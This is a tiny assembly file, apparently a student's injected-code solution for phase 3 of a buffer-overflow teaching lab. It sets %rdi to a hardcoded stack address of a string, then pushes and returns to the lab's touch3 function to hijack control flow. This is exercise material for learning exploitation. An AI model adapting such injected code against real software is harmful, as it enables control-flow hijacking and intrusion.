# phase3.s

# 1. Move the address of the string (Buffer + 0x14) into %rdi
mov $0x5561dc8c, %rdi

# 2. Push the address of touch3 onto the stack
push $0x401908

# 3. Return (This pops the address we just pushed and jumps to touch3)
ret
